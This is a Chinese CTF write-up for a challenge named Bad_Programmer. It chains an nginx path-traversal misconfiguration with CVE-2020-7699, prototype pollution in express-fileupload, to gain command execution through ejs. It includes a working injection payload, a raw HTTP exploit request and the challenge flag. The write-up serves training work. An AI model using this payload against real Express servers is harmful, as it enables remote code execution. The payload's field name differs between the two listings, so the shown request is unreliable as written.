# Bad_Programmer

> nginx配置不当和CVE-2020-7699

## 分析

> 源码无发现,根据请求发现网站使用了node.js的express框架,扫目录,发现存在/static/目录,访问.根据经验,这种是nginx配置文件设置可查看目录,并且网址映射可能出现偏差,尝试/static…/访问到了网站源码源码.

> 查看许多文件后,发现package.json文件里的内容提及了服务器所在目录是/app,并且express-fileupload版本为1.1.7-alpha.4.而刚好此版本存在CVE-2020-7699,原型链污染漏洞.这个漏洞大概就是向ejs文件提交post请求,用bp抓包,并将提交的字段名改为__proto__.outputFunctionName,对应的字段值改为x;console.log(1);process.mainModule.require('child_process').exec('ls');x,便可以控制服务器的shell

> 根据经验,flag一般是在根目录下,将其复制到可以通过网站来访问的目录下

```
x;console.log(1);process.mainModule.require('child_process').exec('cp /flag.txt /app/static/js/flag.txt');x
```


## payload

```
POST /4_pATh_y0u_CaNN07_Gu3ss HTTP/1.1
Host: 61.147.171.105:60548
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 250
Content-Type: multipart/form-data; boundary=622ef228150df44b3e09060c6fb6282b

--622ef228150df44b3e09060c6fb6282b
Content-Disposition: form-data; 
name="proto.outputFunctionName"

x;console.log(1);process.mainModule.require('child_process').exec('cp /flag.txt /app/static/js/flag.txt');x
--622ef228150df44b3e09060c6fb6282b--
```

## flag

> cyberpeace{b070fad4168f1956ba722332a9b7c1f5}

## 参考

> https://blog.csdn.net/gental_z/article/details/107937110